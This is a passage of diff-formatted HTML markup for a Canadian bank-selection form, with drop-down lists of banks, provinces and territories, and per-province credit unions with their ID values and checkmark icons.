+<div class="pure-u-1 pure-u-sm-1-2">
+<div class="pure-g padding-top-25 margin-desktop-only-left-25">
+<div class="pure-u-1">
+<label for="selectFiId">Select Your Financial Institution</label>
+</div>
+<div class="pure-u-11-12 selectFi">
+<select aria-labelledby="selectFiHint" data-mini="true" data-role="none" id="selectFiId" name="selectFiId" path="fiInfoList">
+<option value="">Select institution</option>
+<option cuid="888330006" filabel="Alterna Bank" value="CA000809">Alterna Bank</option>
+<option cuid="" filabel="ATB Financial" value="CA000219">ATB Financial</option>
+<option cuid="818280308" filabel="BANK OF CHINA (CANADA)" value="CA000809">BANK OF CHINA (CANADA)</option>
+<option cuid="" filabel="BMO Bank of Montreal" value="CA000001">BMO Bank of Montreal</option>
+<option cuid="858310030" filabel="Canadian Western Bank" value="CA000809">Canadian Western Bank</option>
+<option cuid="" filabel="Central 1 Credit Union" value="CA000809">Central 1 Credit Union</option>
+<option cuid="" filabel="CIBC" value="CA000010">CIBC</option>
+<option cuid="" filabel="Coast Capital Savings Federal CU" value="CA000382">Coast Capital Savings Federal CU</option>
+<option cuid="818096850" filabel="CTBC Bank Canada" value="CA000809">CTBC Bank Canada</option>
+<option cuid="" filabel="DCBank" value="CA000352">DCBank</option>
+<option cuid="" filabel="Desjardins" value="CA000815">Desjardins</option>
+<option cuid="818096870" filabel="EQ Bank" value="CA000809">EQ Bank</option>
+<option cuid="" filabel="FCDQ" value="CA001110">FCDQ</option>
+<option cuid="818997601" filabel="First Nations Bank of Canada" value="CA000809">First Nations Bank of Canada</option>
+<option cuid="813210012" filabel="Habib Canadian Bank" value="CA000809">Habib Canadian Bank</option>
+<option cuid="818280275" filabel="Hana Bank Canada" value="CA000809">Hana Bank Canada</option>
+<option cuid="818283810" filabel="Haventree Bank" value="CA000809">Haventree Bank</option>
+<option cuid="894168800" filabel="ICICI Bank Canada" value="CA001110">ICICI Bank Canada</option>
+<option cuid="" filabel="KOHO Financial" value="CA156562">KOHO Financial</option>
+<option cuid="038860000" filabel="Laurentian Bank" value="CA000809">Laurentian Bank</option>
+<option cuid="" filabel="Meridian" value="CA000837">Meridian</option>
+<option cuid="858310031" filabel="Motive Financial" value="CA000809">Motive Financial</option>
+<option cuid="" filabel="National Bank" value="CA000006">National Bank</option>
+<option cuid="641201711" filabel="National Bank  Businesses" value="CA000006">National Bank  Businesses</option>
+<option cuid="818283005" filabel="Neo Financial" value="CA000809">Neo Financial</option>
+<option cuid="" filabel="PC Financial" value="CA000320">PC Financial</option>
+<option cuid="895420000" filabel="Peace Hills Trust" value="CA000809">Peace Hills Trust</option>
+<option cuid="816211620" filabel="Peoples Bank of Canada" value="CA000809">Peoples Bank of Canada</option>
+<option cuid="621165383" filabel="Peoples Bank of Canada" value="CA000621">Peoples Bank of Canada</option>
+<option cuid="" filabel="Peoples Trust" value="CA000621">Peoples Trust</option>
+<option cuid="816211601" filabel="Peoples Trust" value="CA000809">Peoples Trust</option>
+<option cuid="" filabel="RBC Royal Bank" value="CA000003">RBC Royal Bank</option>
+<option cuid="818284000" filabel="SBI Canada Bank" value="CA000809">SBI Canada Bank</option>
+<option cuid="" filabel="Scotiabank" value="CA000002">Scotiabank</option>
+<option cuid="921353801" filabel="SHINHAN BANK CANADA" value="CA000809">SHINHAN BANK CANADA</option>
+<option cuid="000030800" filabel="Simplii Financial" value="CA000010">Simplii Financial</option>
+<option cuid="" filabel="Tangerine Bank" value="CA000614">Tangerine Bank</option>
+<option cuid="" filabel="TD Canada Trust" value="CA000004">TD Canada Trust</option>
+<option cuid="818017570" filabel="Vancity Community Investment Bank" value="CA000809">Vancity Community Investment Bank</option>
+<option cuid="818283708" filabel="Wealth One Bank of Canada" value="CA000809">Wealth One Bank of Canada</option>
+<option cuid="818287030" filabel="Wealthsimple" value="CA000809">Wealthsimple</option>
+</select>
+<span class="hint-label" id="selectFiHint">Select a Financial Institution from the list above</span>
+</div>
+<div class="pure-u-1-24 resp-accessory-padding" id="fiAccessoryCheckmark" style="display:none;">
+<svg class="check-mark-select" enable-background="new 0 10 165 165" overflow="visible" version="1.1" viewbox="0 0 165 165" width="25px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<switch>
+<g>
+<defs></defs>
+<circle cx="82.5" cy="82.5" fill="#39B54A" r="82.5"></circle>
+<path d="M51.404,109.79c-1.951,1.952-1.951,5.118,0,7.071l8.84,8.838c1.951,1.952,5.117,1.952,7.07,0l70.489-70.489  c1.951-1.953,1.951-5.119,0-7.071l-8.838-8.838c-1.953-1.953-5.119-1.953-7.072,0L51.404,109.79z" fill="#FFFFFF"></path>
+<path d="M76.402,109.79c1.953,1.952,1.953,5.119,0,7.071l-8.838,8.838c-1.953,1.952-5.119,1.952-7.07,0  L27.195,92.401c-1.951-1.952-1.951-5.118,0-7.07l8.838-8.839  c1.953-1.952,5.119-1.952,7.072,0L76.402,109.79z" fill="#FFFFFF"></path>
+</g>
+</switch>
+</svg>
+</div>
+</div>
+</div>
+<div class="pure-u-1 pure-u-sm-1-2 desktop-only-left-grey-border">
+<div class="pure-g padding-top-25 margin-desktop-only-left-25">
+<div class="pure-u-11-12">
+<label for="province">Select Province or Territory</label>
+<select aria-labelledby="selectProvHint" class="fi-select" data-role="none" id="province" name="province">
+<option value="">
+		                   Select Province or Territory
+		               </option>
+<option value="AB">
+						Alberta
+						</option>
+<option value="BC">
+						British Columbia
+						</option>
+<option value="MB">
+						Manitoba
+						</option>
+<option value="NB">
+						New Brunswick
+						</option>
+<option value="NL">
+						Newfoundland and Labrador
+						</option>
+<option value="NT">
+						Northwest Territories
+						</option>
+<option value="NS">
+						Nova Scotia
+						</option>
+<option value="NU">
+						Nunavut
+						</option>
+<option value="ON">
+						Ontario
+						</option>
+<option value="PE">
+						Prince Edward Island
+						</option>
+<option value="QC">
+						Quebec
+						</option>
+<option value="SK">
+						Saskatchewan
+						</option>
+<option value="YT">
+						Yukon Territory
+						</option>
+</select>
+<span class="hint-label" id="selectProvHint">Select a Province from the list above</span>
+</div>
+<div class="pure-u-1-24 translate-y-d-20 resp-accessory-padding" id="provinceAccessoryCheckmark" style="display:none">
+<svg class="check-mark-select" enable-background="new 0 10 165 165" height="25px" overflow="visible" version="1.1" viewbox="0 0 165 165" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<switch>
+<g>
+<defs></defs>
+<circle cx="82.5" cy="82.5" fill="#39B54A" r="82.5"></circle>
+<path d="M51.404,109.79c-1.951,1.952-1.951,5.118,0,7.071l8.84,8.838c1.951,1.952,5.117,1.952,7.07,0l70.489-70.489  c1.951-1.953,1.951-5.119,0-7.071l-8.838-8.838c-1.953-1.953-5.119-1.953-7.072,0L51.404,109.79z" fill="#FFFFFF"></path>
+<path d="M76.402,109.79c1.953,1.952,1.953,5.119,0,7.071l-8.838,8.838c-1.953,1.952-5.119,1.952-7.07,0  L27.195,92.401c-1.951-1.952-1.951-5.118,0-7.07l8.838-8.839    c1.953-1.952,5.119-1.952,7.072,0L76.402,109.79z" fill="#FFFFFF"></path>
+</g>
+</switch>
+</svg>
+</div>
+</div>
+<div class="pure-g padding-top-25 margin-desktop-only-left-25">
+<div class="pure-u-11-12">
+<div class="selectCu" id="placeholderCU">
+<label for="placeholderDropdown">Select Credit Union</label>
+<select aria-labelledby="selectCuHintDisabled" data-role="none" disabled="" id="placeholderDropdown" name="selectCuId">
+<option value="">Select a Province Above</option>
+</select>
+<span class="hint-label" id="selectCuHintDisabled">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="AB" style="display: none;">
+<label for="selectCu-AB" id="selectCu-title-AB">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-AB" data-role="none" id="selectCu-AB" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000869" filabel="1st Choice Savings and Credit Union" value="046610163">1st Choice Savings and Credit Union</option>
+<option fiid="CA000869" filabel="Bow Valley Credit Union" value="046610021">Bow Valley Credit Union</option>
+<option fiid="CA000869" filabel="Christian Credit Union" value="046610215">Christian Credit Union</option>
+<option fiid="CA000869" filabel="Connect First Credit Union" value="046610100">Connect First Credit Union</option>
+<option fiid="CA000869" filabel="Lakeland Credit Union" value="046610379">Lakeland Credit Union</option>
+<option fiid="CA000869" filabel="Rocky Credit Union" value="046610305">Rocky Credit Union</option>
+<option fiid="CA000869" filabel="SERVUS CREDIT UNION" value="294420010">SERVUS CREDIT UNION</option>
+<option fiid="CA000869" filabel="Vermilion Credit Union" value="046612298">Vermilion Credit Union</option>
+<option fiid="CA000869" filabel="Vision Credit Union" value="046610254">Vision Credit Union</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-AB">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="BC" style="display: none;">
+<label for="selectCu-BC" id="selectCu-title-BC">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-BC" data-role="none" id="selectCu-BC" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000809" filabel="Beem Credit Union" value="833600040">Beem Credit Union</option>
+<option fiid="CA000809" filabel="Bulkley Valley Credit Union" value="818090500">Bulkley Valley Credit Union</option>
+<option fiid="CA000809" filabel="Cascadia Credit Union" value="818091270">Cascadia Credit Union</option>
+<option fiid="CA000809" filabel="Coastal Community Credit Union" value="818091529">Coastal Community Credit Union</option>
+<option fiid="CA000809" filabel="Columbia Valley Credit Union" value="818093300">Columbia Valley Credit Union</option>
+<option fiid="CA000809" filabel="Community Savings BC" value="819770002">Community Savings BC</option>
+<option fiid="CA000809" filabel="Creston and District CU (BC)" value="818092340">Creston and District CU (BC)</option>
+<option fiid="CA000809" filabel="Envision Financial, division of Tru Cooperative Bank" value="818094560">Envision Financial, division of Tru Cooperative Bank</option>
+<option fiid="CA000809" filabel="First Credit Union" value="818090010">First Credit Union</option>
+<option fiid="CA000809" filabel="Greater Vancouver Community Credit Union" value="818090210">Greater Vancouver Community Credit Union</option>
+<option fiid="CA000809" filabel="Integris" value="818094750">Integris</option>
+<option fiid="CA000809" filabel="Island Savings, division of Tru Cooperative Bank" value="816280002">Island Savings, division of Tru Cooperative Bank</option>
+<option fiid="CA000809" filabel="Khalsa Credit Union" value="818094640">Khalsa Credit Union</option>
+<option fiid="CA000809" filabel="Kootenay Savings Credit Union" value="317442300">Kootenay Savings Credit Union</option>
+<option fiid="CA000809" filabel="Ladysmith &amp; District Credit Union" value="818091160">Ladysmith &amp; District Credit Union</option>
+<option fiid="CA000809" filabel="Lake View Credit Union" value="818091010">Lake View Credit Union</option>
+<option fiid="CA000809" filabel="Nelson and District Credit Union" value="818092200">Nelson and District Credit Union</option>
+<option fiid="CA000809" filabel="Northern Savings Credit Union" value="818091390">Northern Savings Credit Union</option>
+<option fiid="CA000809" filabel="Prospera" value="271350000">Prospera</option>
+<option fiid="CA000809" filabel="SASCU Credit Union" value="833601570">SASCU Credit Union</option>
+<option fiid="CA000809" filabel="Sharons Credit Union" value="818090130">Sharons Credit Union</option>
+<option fiid="CA000809" filabel="StellerVista Credit Union" value="818092230">StellerVista Credit Union</option>
+<option fiid="CA000809" filabel="Sunshine Coast Financial" value="818090660">Sunshine Coast Financial</option>
+<option fiid="CA000809" filabel="Valley First and Enderby &amp; District Financial, divisions of Tru Cooperative Bank" value="818091660">Valley First and Enderby &amp; District Financial, divisions of Tru Cooperative Bank</option>
+<option fiid="CA000809" filabel="Vancity" value="813530002">Vancity</option>
+<option fiid="CA000809" filabel="Vancouver Firefighters Credit Union" value="818093720">Vancouver Firefighters Credit Union</option>
+<option fiid="CA000809" filabel="VantageOne Credit Union(BC)" value="833601260">VantageOne Credit Union(BC)</option>
+<option fiid="CA000869" filabel="Williams Lake and District Credit Union" value="818092500">Williams Lake and District Credit Union</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-BC">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="MB" style="display: none;">
+<label for="selectCu-MB" id="selectCu-title-MB">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-MB" data-role="none" id="selectCu-MB" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000869" filabel="Access Credit Union" value="821630070">Access Credit Union</option>
+<option fiid="CA000869" filabel="Assiniboine CU" value="821630010">Assiniboine CU</option>
+<option fiid="CA000809" filabel="Belgian-Alliance Credit Union Ltd" value="818790087">Belgian-Alliance Credit Union Ltd</option>
+<option fiid="CA000869" filabel="Cambrian Credit Union" value="821630080">Cambrian Credit Union</option>
+<option fiid="CA000809" filabel="Compass Credit Union" value="821630900">Compass Credit Union</option>
+<option fiid="CA000809" filabel="Flin Flon Credit Union" value="821631240">Flin Flon Credit Union</option>
+<option fiid="CA000869" filabel="Fusion Credit Union" value="821630410">Fusion Credit Union</option>
+<option fiid="CA000809" filabel="MaxaFinancial Credit Union" value="818796292">MaxaFinancial Credit Union</option>
+<option fiid="CA000809" filabel="Me-Dian Credit Union" value="821630050">Me-Dian Credit Union</option>
+<option fiid="CA000809" filabel="Niverville Credit Union" value="821630100">Niverville Credit Union</option>
+<option fiid="CA000809" filabel="Outlook Financial" value="821631840">Outlook Financial</option>
+<option fiid="CA000809" filabel="Rosenort Credit Union Limited" value="821630400">Rosenort Credit Union Limited</option>
+<option fiid="CA000869" filabel="Steinbach Credit Union" value="821630470">Steinbach Credit Union</option>
+<option fiid="CA000809" filabel="Stride Credit Union" value="821630020">Stride Credit Union</option>
+<option fiid="CA000809" filabel="Sunrise Credit Union" value="821630490">Sunrise Credit Union</option>
+<option fiid="CA000869" filabel="Swan Valley Credit Union" value="821630030">Swan Valley Credit Union</option>
+<option fiid="CA000809" filabel="Westoba Credit Union" value="821630160">Westoba Credit Union</option>
+<option fiid="CA000809" filabel="Winnipeg Police Credit Union" value="818790079">Winnipeg Police Credit Union</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-MB">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="NB" style="display: none;">
+<label for="selectCu-NB" id="selectCu-title-NB">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-NB" data-role="none" id="selectCu-NB" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000809" filabel="Beaubear Credit Union Limited" value="888900709">Beaubear Credit Union Limited</option>
+<option fiid="CA000809" filabel="Blackville Credit Union" value="888900713">Blackville Credit Union</option>
+<option fiid="CA000809" filabel="Brunswick Credit Union" value="818496700">Brunswick Credit Union</option>
+<option fiid="CA000809" filabel="New Brunswick Teachers Association Credit Union Ltd." value="888900711">New Brunswick Teachers Association Credit Union Ltd.</option>
+<option fiid="CA000809" filabel="OMISTA Credit Union" value="888900701">OMISTA Credit Union</option>
+<option fiid="CA000809" filabel="UNI Financial Cooperation" value="828994121">UNI Financial Cooperation</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-NB">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="NL" style="display: none;">
+<label for="selectCu-NL" id="selectCu-title-NL">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-NL" data-role="none" id="selectCu-NL" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000809" filabel="Atlantic Edge Credit Union" value="888900813">Atlantic Edge Credit Union</option>
+<option fiid="CA000809" filabel="Community Credit Union Ltd" value="888900801">Community Credit Union Ltd</option>
+<option fiid="CA000809" filabel="Newfoundland and Labrador Credit Union" value="888900802">Newfoundland and Labrador Credit Union</option>
+<option fiid="CA000809" filabel="Public Service Credit Union Ltd." value="888900814">Public Service Credit Union Ltd.</option>
+<option fiid="CA000809" filabel="Reddy Kilowatt Credit Union" value="888900821">Reddy Kilowatt Credit Union</option>
+<option fiid="CA000809" filabel="Venture Credit Union Limited" value="888900828">Venture Credit Union Limited</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-NL">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="NT" style="display: none;">
+<label for="selectCu-NT" id="selectCu-title-NT">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-NT" data-role="none" id="selectCu-NT" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-NT">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="NS" style="display: none;">
+<label for="selectCu-NS" id="selectCu-title-NS">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-NS" data-role="none" id="selectCu-NS" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000809" filabel="Acadian Credit Union Limited" value="888900047">Acadian Credit Union Limited</option>
+<option fiid="CA000809" filabel="Caisse populaire de Clare" value="888900229">Caisse populaire de Clare</option>
+<option fiid="CA000809" filabel="Cape Breton Credit Union" value="888900016">Cape Breton Credit Union</option>
+<option fiid="CA000809" filabel="Coastal Financial Credit Union" value="888900193">Coastal Financial Credit Union</option>
+<option fiid="CA000809" filabel="CUA" value="888900337">CUA</option>
+<option fiid="CA000809" filabel="DOMINION CREDIT UNION" value="888900027">DOMINION CREDIT UNION</option>
+<option fiid="CA000809" filabel="East Coast Credit Union" value="888900057">East Coast Credit Union</option>
+<option fiid="CA000809" filabel="Glace Bay Central Credit Union Ltd" value="888900354">Glace Bay Central Credit Union Ltd</option>
+<option fiid="CA000809" filabel="iNova Credit Union Limited" value="888900049">iNova Credit Union Limited</option>
+<option fiid="CA000809" filabel="Mosaik Credit Union" value="888900335">Mosaik Credit Union</option>
+<option fiid="CA000809" filabel="New Waterford Credit Union" value="888900019">New Waterford Credit Union</option>
+<option fiid="CA000809" filabel="Princess Credit Union" value="888900359">Princess Credit Union</option>
+<option fiid="CA000809" filabel="St. Joseph's CU" value="888900052">St. Joseph's CU</option>
+<option fiid="CA000809" filabel="Sydney Credit Union Limited" value="888900349">Sydney Credit Union Limited</option>
+<option fiid="CA000809" filabel="Teachers Plus Credit Union" value="888900288">Teachers Plus Credit Union</option>
+<option fiid="CA000809" filabel="Valley Credit Union Limited" value="888900263">Valley Credit Union Limited</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-NS">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="NU" style="display: none;">
+<label for="selectCu-NU" id="selectCu-title-NU">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-NU" data-role="none" id="selectCu-NU" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-NU">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="ON" style="display: none;">
+<label for="selectCu-ON" id="selectCu-title-ON">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-ON" data-role="none" id="selectCu-ON" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000809" filabel="Alterna Savings" value="888330005">Alterna Savings</option>
+<option fiid="CA000809" filabel="Bay Credit Union" value="818280618">Bay Credit Union</option>
+<option fiid="CA000809" filabel="BCU Financial" value="818280675">BCU Financial</option>
+<option fiid="CA000809" filabel="Caisse populaire Alliance limite" value="818903012">Caisse populaire Alliance limite</option>
+<option fiid="CA000809" filabel="Comtech Fire Credit Union" value="818280033">Comtech Fire Credit Union</option>
+<option fiid="CA000809" filabel="DUCA" value="897810013">DUCA</option>
+<option fiid="CA000809" filabel="Equity Credit Union" value="818280145">Equity Credit Union</option>
+<option fiid="CA000809" filabel="Finnish Credit Union" value="818281463">Finnish Credit Union</option>
+<option fiid="CA000809" filabel="FirstOntario Credit Union Limited" value="818286292">FirstOntario Credit Union Limited</option>
+<option fiid="CA000809" filabel="Frontline Financial Credit Union" value="818280384">Frontline Financial Credit Union</option>
+<option fiid="CA000809" filabel="Ganaraska Financial Credit Union" value="818280244">Ganaraska Financial Credit Union</option>
+<option fiid="CA000809" filabel="Golden Horseshoe Credit Union" value="818282188">Golden Horseshoe Credit Union</option>
+<option fiid="CA000809" filabel="HMECU/Healthcare and Municipal Employees Credit Union" value="818280041">HMECU/Healthcare and Municipal Employees Credit Union</option>
+<option fiid="CA000809" filabel="IC Savings" value="818282145">IC Savings</option>
+<option fiid="CA000809" filabel="Kawartha Financial Services" value="818280632">Kawartha Financial Services</option>
+<option fiid="CA000809" filabel="Kindred Credit Union" value="818281794">Kindred Credit Union</option>
+<option fiid="CA000809" filabel="Kingston Community" value="818281444">Kingston Community</option>
+<option fiid="CA000809" filabel="L.I.U.N.A. LOCAL 183 CREDIT UNION LIMITED" value="818282087">L.I.U.N.A. LOCAL 183 CREDIT UNION LIMITED</option>
+<option fiid="CA000809" filabel="Libro Credit Union" value="818286282">Libro Credit Union</option>
+<option fiid="CA000809" filabel="Luminus Financial" value="818280622">Luminus Financial</option>
+<option fiid="CA000809" filabel="Mainstreet Credit Union" value="818281383">Mainstreet Credit Union</option>
+<option fiid="CA000809" filabel="Motor City Community Credit Union Limited" value="818282126">Motor City Community Credit Union Limited</option>
+<option fiid="CA000809" filabel="Moya Financial" value="891433200">Moya Financial</option>
+<option fiid="CA000809" filabel="Northern Birch Credit Union" value="818280946">Northern Birch Credit Union</option>
+<option fiid="CA000809" filabel="Northern Credit Union Limited (Ontario)" value="818281449">Northern Credit Union Limited (Ontario)</option>
+<option fiid="CA000809" filabel="Omnia Direct" value="818282119">Omnia Direct</option>
+<option fiid="CA000809" filabel="Ontario Educational Credit Union" value="818281696">Ontario Educational Credit Union</option>
+<option fiid="CA000809" filabel="OPPA Credit Union" value="818282027">OPPA Credit Union</option>
+<option fiid="CA000809" filabel="Oshawa Community Credit Union" value="818280630">Oshawa Community Credit Union</option>
+<option fiid="CA000809" filabel="Parama Credit Union" value="818280780">Parama Credit Union</option>
+<option fiid="CA000809" filabel="Pathwise Credit Union" value="818280171">Pathwise Credit Union</option>
+<option fiid="CA000809" filabel="PenFinancial Credit Union" value="818280603">PenFinancial Credit Union</option>
+<option fiid="CA000809" filabel="Resurrection Credit Union Limited" value="021170000">Resurrection Credit Union Limited</option>
+<option fiid="CA000809" filabel="Saven Financial" value="818286500">Saven Financial</option>
+<option fiid="CA000809" filabel="Southwest Regional Credit Union" value="818282120">Southwest Regional Credit Union</option>
+<option fiid="CA000809" filabel="St. Stanislaus - St. Casimirs Polish Parishes Credit Union" value="011900000">St. Stanislaus - St. Casimirs Polish Parishes Credit Union</option>
+<option fiid="CA000809" filabel="Sudbury Credit Union Limited" value="818280602">Sudbury Credit Union Limited</option>
+<option fiid="CA000809" filabel="Taiwanese Credit Union" value="818282089">Taiwanese Credit Union</option>
+<option fiid="CA000809" filabel="TALKA CREDIT UNION LIMITED" value="818281189">TALKA CREDIT UNION LIMITED</option>
+<option fiid="CA000809" filabel="Tandia Financial" value="818280052">Tandia Financial</option>
+<option fiid="CA000809" filabel="THE ENERGY CREDIT UNION LIMITED" value="818280067">THE ENERGY CREDIT UNION LIMITED</option>
+<option fiid="CA000809" filabel="The Police Credit Union Limited" value="818280289">The Police Credit Union Limited</option>
+<option fiid="CA000809" filabel="Thorold Community Credit Union Limited" value="818280376">Thorold Community Credit Union Limited</option>
+<option fiid="CA000809" filabel="Ukrainian Credit Union Limited" value="818280197">Ukrainian Credit Union Limited</option>
+<option fiid="CA000809" filabel="Windsor Family Credit Union Limited" value="818282118">Windsor Family Credit Union Limited</option>
+<option fiid="CA000809" filabel="YNCU" value="818280340">YNCU</option>
+<option fiid="CA000809" filabel="Your Credit Union" value="818281710">Your Credit Union</option>
+<option fiid="CA000809" filabel="ZUNI" value="818280219">ZUNI</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-ON">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="PE" style="display: none;">
+<label for="selectCu-PE" id="selectCu-title-PE">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-PE" data-role="none" id="selectCu-PE" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000809" filabel="Consolidated Credit Union" value="888900904">Consolidated Credit Union</option>
+<option fiid="CA000809" filabel="Morell Credit Union" value="888900908">Morell Credit Union</option>
+<option fiid="CA000809" filabel="Provincial Credit Union" value="888900907">Provincial Credit Union</option>
+<option fiid="CA000809" filabel="Souris Credit Union Ltd" value="888900909">Souris Credit Union Ltd</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-PE">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="QC" style="display: none;">
+<label for="selectCu-QC" id="selectCu-title-QC">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-QC" data-role="none" id="selectCu-QC" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-QC">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="SK" style="display: none;">
+<label for="selectCu-SK" id="selectCu-title-SK">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-SK" data-role="none" id="selectCu-SK" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+<option fiid="CA000809" filabel="Accent Credit Union" value="818894540">Accent Credit Union</option>
+<option fiid="CA000809" filabel="Affinity Credit Union" value="378601000">Affinity Credit Union</option>
+<option fiid="CA000809" filabel="Bengough Credit Union" value="818890890">Bengough Credit Union</option>
+<option fiid="CA000869" filabel="Biggar &amp; District Credit Union" value="818891500">Biggar &amp; District Credit Union</option>
+<option fiid="CA000809" filabel="Bruno Savings and Credit Union Limited" value="818891440">Bruno Savings and Credit Union Limited</option>
+<option fiid="CA000809" filabel="Churchbridge Credit Union" value="818890960">Churchbridge Credit Union</option>
+<option fiid="CA000869" filabel="Conexus Credit Union" value="818890010">Conexus Credit Union</option>
+<option fiid="CA000869" filabel="Cornerstone Credit Union" value="818890450">Cornerstone Credit Union</option>
+<option fiid="CA000869" filabel="Crossroads Credit Union" value="818891850">Crossroads Credit Union</option>
+<option fiid="CA000869" filabel="Dodsland Credit Union" value="818891940">Dodsland Credit Union</option>
+<option fiid="CA000809" filabel="Edam Credit Union " value="818891990">Edam Credit Union </option>
+<option fiid="CA000869" filabel="Foam Lake Credit Union" value="818892130">Foam Lake Credit Union</option>
+<option fiid="CA000809" filabel="Innovation Federal Credit Union" value="818891350">Innovation Federal Credit Union</option>
+<option fiid="CA000809" filabel="Kerrobert Credit Union" value="818892620">Kerrobert Credit Union</option>
+<option fiid="CA000809" filabel="Lafleche Credit Union" value="818892010">Lafleche Credit Union</option>
+<option fiid="CA000869" filabel="Luseland Credit Union" value="818892840">Luseland Credit Union</option>
+<option fiid="CA000809" filabel="North Valley Credit Union" value="818892070">North Valley Credit Union</option>
+<option fiid="CA000809" filabel="Prairie Pride Credit Union" value="818891070">Prairie Pride Credit Union</option>
+<option fiid="CA000869" filabel="Prosperity Credit Union" value="818892450">Prosperity Credit Union</option>
+<option fiid="CA000809" filabel="Radius Credit Union" value="818891780">Radius Credit Union</option>
+<option fiid="CA000809" filabel="Raymore Credit Union" value="818893380">Raymore Credit Union</option>
+<option fiid="CA000809" filabel="Rockglen-Killdeer Credit Union Limited" value="818893490">Rockglen-Killdeer Credit Union Limited</option>
+<option fiid="CA000869" filabel="Sandhills Credit Union" value="818892780">Sandhills Credit Union</option>
+<option fiid="CA000809" filabel="Saskatoon City Employees Credit Union" value="818893540">Saskatoon City Employees Credit Union</option>
+<option fiid="CA000809" filabel="St. Gregor Credit Union" value="818893750">St. Gregor Credit Union</option>
+<option fiid="CA000809" filabel="Stoughton Credit Union" value="818893820">Stoughton Credit Union</option>
+<option fiid="CA000869" filabel="Synergy Credit Union" value="818891650">Synergy Credit Union</option>
+<option fiid="CA000869" filabel="TCU Financial Group" value="818890710">TCU Financial Group</option>
+<option fiid="CA000809" filabel="Turtleford Credit Union" value="818893920">Turtleford Credit Union</option>
+<option fiid="CA000869" filabel="Unity Credit Union" value="818891750">Unity Credit Union</option>
+<option fiid="CA000869" filabel="Weyburn Credit Union" value="818890810">Weyburn Credit Union</option>
+<option fiid="CA000869" filabel="ZChurchbridge Pilot" value="818890960">ZChurchbridge Pilot</option>
+<option fiid="CA000869" filabel="zRadius Credit Union Limited" value="818891780">zRadius Credit Union Limited</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-SK">Select a Credit Union from the list above</span>
+</div>
+<div class="selectCu" provincecode="YT" style="display: none;">
+<label for="selectCu-YT" id="selectCu-title-YT">
+							Select Credit Union
+						</label>
+<select aria-labelledby="selectCu-hintlabel-YT" data-role="none" id="selectCu-YT" name="selectCuId">
+<option value="">
+			                   	 	Select Credit Union
+						  		</option>
+</select>
+<span class="hint-label" id="selectCu-hintlabel-YT">Select a Credit Union from the list above</span>
+</div>
+</div>
+<div class="pure-u-1-24 translate-y-d-20 resp-accessory-padding" id="cuAccessoryCheckmark" style="display:none">
+<svg class="check-mark-select" enable-background="new 0 10 165 165" overflow="visible" version="1.1" viewbox="0 0 165 165" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<switch>
+<g>
+<defs></defs>
+<circle cx="82.5" cy="82.5" fill="#39B54A" r="82.5"></circle>
